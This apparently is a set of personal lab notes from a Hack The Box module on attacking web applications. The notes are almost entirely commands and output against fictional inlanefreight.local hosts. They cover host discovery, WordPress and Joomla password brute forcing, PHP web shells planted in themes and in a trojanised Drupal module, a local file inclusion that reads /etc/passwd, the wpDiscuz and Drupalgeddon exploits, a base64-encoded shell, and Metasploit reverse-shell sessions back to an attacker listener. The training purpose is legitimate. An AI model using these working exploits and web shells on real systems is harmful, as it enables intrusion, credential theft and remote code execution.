## Module Targets
```
mdmithu@htb[/htb]$ IP=10.129.42.195
mdmithu@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```
```
mdmithu@htb[/htb]$ cat /etc/hosts
#
127.0.1.1 htb-9zftpkslke.htb-cloud.com htb-9zftpkslke
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

10.129.42.195   app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
```
### Application Discovery & Enumeration

```
mdmithu@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
```
mdmithu@htb[/htb]$ cat scope_list 

app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```
```
mdmithu@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT
Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.24% done; ETC: 21:49 (0:00:01 remaining)

Nmap scan report for app.inlanefreight.local (10.129.42.195)
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.12s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8009/tcp open  ajp13
8080/tcp open  http-proxy
8180/tcp open  unknown
8888/tcp open  sun-answerbook

Nmap scan report for gitlab-dev.inlanefreight.local (10.129.201.88)
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8000/tcp open  http-alt
8080/tcp open  http-proxy
8089/tcp open  unknown
```
```
mdmithu@htb[/htb]$ sudo nmap --open -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT
Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd (free license; remote login disabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds

```
```
mdmithu@htb[/htb]$ sudo apt install eyewitness
```
```
mdmithu@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (26 Hosts)
Attempting to screenshot http://app.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local:8000
Attempting to screenshot http://app-dev.inlanefreight.local:8080
Attempting to screenshot http://gitlab-dev.inlanefreight.local
Attempting to screenshot http://10.129.201.50
Attempting to screenshot http://10.129.201.50:8000
Attempting to screenshot http://10.129.201.50:8080
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8000
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8080
Attempting to screenshot http://support-dev.inlanefreight.local
Attempting to screenshot http://drupal-dev.inlanefreight.local
[*] Hit timeout limit when connecting to http://10.129.201.50:8000, retrying
Attempting to screenshot http://jenkins.inlanefreight.local
Attempting to screenshot http://jenkins.inlanefreight.local:8000
Attempting to screenshot http://jenkins.inlanefreight.local:8080
Attempting to screenshot http://support.inlanefreight.local
[*] Completed 15 out of 26 services
Attempting to screenshot http://drupal-qa.inlanefreight.local
Attempting to screenshot http://web01.inlanefreight.local
```
#### Using Aquatone
```
mdmithu@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```
```
mdmithu@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 

Archive:  aquatone_linux_amd64_1.7.0.zip
  inflating: aquatone                
  inflating: README.md               
  inflating: LICENSE.txt
```
```
mdmithu@htb[/htb]$ echo $PATH

/home/mrb3n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
```
mdmithu@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap

aquatone v1.7.0 started at 2021-09-07T22:31:03-04:00

Targets    : 65
Threads    : 6
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://web01.inlanefreight.local:8000/: 403 Forbidden
http://app.inlanefreight.local/: 200 OK
http://jenkins.inlanefreight.local/: 403 Forbidden
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://jenkins.inlanefreight.local:8000/: 403 Forbidden
http://web01.inlanefreight.local:8080/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://10.129.201.50:8000/: 200 OK

<SNIP>

http://web01.inlanefreight.local:8000/: screenshot successful
http://app.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://jenkins.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://jenkins.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8080/: screenshot successful
http://app.inlanefreight.local/: screenshot successful

<SNIP>

Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2021-09-07T22:31:03-04:00
 - Finished at : 2021-09-07T22:31:36-04:00
 - Duration    : 33s

Requests:
 - Successful : 65
 - Failed     : 0

 - 2xx : 47
 - 3xx : 0
 - 4xx : 18
 - 5xx : 0

Screenshots:
 - Successful : 65
 - Failed     : 0

Wrote HTML report to: aquatone_report.html
```
## WordPress - Discovery & Enumeration
```
mdmithu@htb[/htb]$ robots.txt
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml

```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /
```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
        <link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```
```
mdmithu@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

<SNIP>

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Thu Sep 16 23:11:43 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
```
## Attacking WordPress

```
mdmithu@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23
```
#### Code Execution
```
system($_GET[0]);
```
```
mdmithu@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### msfconsole
```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```
(wpDiscuz)['https://www.exploit-db.com/exploits/49967']
```
mdmithu@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```
```
mdmithu@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
## Joomla - Discovery & Enumeration
```
mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla

    <meta name="generator" content="Joomla! - Open Source Content Management" />


<SNIP>
```
```
mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5

1- What is this?
    * This is a Joomla! installation/upgrade package to version 3.x
    * Joomla! Official site: https://www.joomla.org
    * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
    * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging

```
```
mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```
```
mdmithu@htb[/htb]$ sudo pip3 install droopescan

Collecting droopescan
  Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
     |████████████████████████████████| 514 kB 5.8 MB/s
     
```
```
mdmithu@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/

[+] Possible version(s):                                                        
    3.8.10
    3.8.11
    3.8.11-rc
    3.8.12
    3.8.12-rc
    3.8.13
    3.8.7
    3.8.7-rc
    3.8.8
    3.8.8-rc
    3.8.9
    3.8.9-rc

[+] Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml

[+] Scan finished (0:00:01.523369 elapsed)
```
```
mdmithu@htb[/htb]$ python2 -m pip install bs4
```
```
mdmithu@htb[/htb]$ python2 joomlascan.py -u http://dev.inlanefreight.local

-------------------------------------------
             Joomla Scan                  
   Usage: python joomlascan.py <target>    
    Version 0.5beta - Database Entries 1233
         created by Andrea Draghetti       
-------------------------------------------
Robots file found:       > http://dev.inlanefreight.local/robots.txt
No Error Log found

Start scan...with 10 concurrent threads!
Component found: com_actionlogs  > http://dev.inlanefreight.local/index.php?option=com_actionlogs
     On the administrator components
Component found: com_admin   > http://dev.inlanefreight.local/index.php?option=com_admin
     On the administrator components
Component found: com_ajax    > http://dev.inlanefreight.local/index.php?option=com_ajax
     But possibly it is not active or protected
     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml
     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml
     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml
     Explorable Directory    > http://dev.inlanefreight.local/components/com_actionlogs/
     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_actionlogs/
     Explorable Directory    > http://dev.inlanefreight.local/components/com_admin/
     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_admin/
Component found: com_banners     > http://dev.inlanefreight.local/index.php?option=com_banners
     But possibly it is not active or protected
     Explorable Directory    > http://dev.inlanefreight.local/components/com_ajax/
     Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_ajax/
     LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml


<SNIP>
```
```
mdmithu@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```
## Attacking Joomla

```
mdmithu@htb[/htb]$ shell.php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
```
mdmithu@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
mdmithu@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```
## Drupal - Discovery & Enumeration

```
mdmithu@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```
```
mdmithu@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
```
mdmithu@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
```
```
mdmithu@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)

```
### Attacking Drupal

```
mdmithu@htb[/htb]$ shell.php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

```
```
mdmithu@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
```
mdmithu@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
```
mdmithu@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
mdmithu@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz

```
```
mdmithu@htb[/htb]$ mv shell.php .htaccess captcha
mdmithu@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```
```
mdmithu@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
mdmithu@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

```
(drupalgeddon2.py )['https://www.exploit-db.com/exploits/44448']
```
        shellsession
mdmithu@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt

```
```
mdmithu@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```
```
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
```
mdmithu@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php

```
```
mdmithu@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Drupalgeddon3
```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec

```
```
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```
## Tomcat - Discovery & Enumeration
```
mdmithu@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```
```
mdmithu@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
```
## Attacking Tomcat
#### Tomcat Manager - Login Brute Force
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
